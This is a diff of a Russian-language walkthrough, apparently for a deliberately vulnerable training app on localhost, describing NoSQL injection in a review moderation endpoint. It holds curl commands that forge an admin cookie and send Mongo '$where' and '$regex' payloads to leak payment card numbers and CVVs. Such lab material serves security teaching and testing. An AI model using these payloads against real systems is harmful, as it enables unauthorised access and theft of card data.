@@ -103,7 +103,7 @@ curl "http://localhost:8000/admin/reports?u=alice" -b "role=YWRtaW4="
 ```
 
 ### NoSQL Injection (`/product/<pid>/reviews/moderation`)
-Сценарий: фильтр модерации принимает JSON-like значения в `author`, `rating`, `text`, `cardholder`. Для демонстрации можно использовать Mongo-операторы `$where`, `$ne`, `$in`, `$regex`.
+Сценарий: фильтр модерации принимает JSON-like значения в `author`, `rating`, `text`, `card_number`. Для демонстрации можно использовать Mongo-операторы `$where`, `$ne`, `$in`, `$regex`.
 
 1) Войти как админ (или подменить cookie `role=YWRtaW4=`).
 2) Открыть `/product/1/reviews/moderation`.
@@ -128,11 +128,11 @@ curl "http://localhost:8000/product/1/reviews/moderation?author={\"$where\":\"th
   -b "role=YWRtaW4="
 ```
 
-Аналогично для `payment_cards` (утечка cardholder/cvv через блок Results):
+Аналогично для `payment_cards` (поиск и утечка данных карты через блок Results):
 ```bash
 curl -X POST "http://localhost:8000/product/1/reviews/moderation" \
   -H "Content-Type: application/x-www-form-urlencoded" \
-  --data-urlencode 'cardholder={"$regex":"^Alice"}' \
+  --data-urlencode 'card_number={"$regex":"^4111"}' \
   --data-urlencode 'status=all' \
   -b "role=YWRtaW4="
 ```
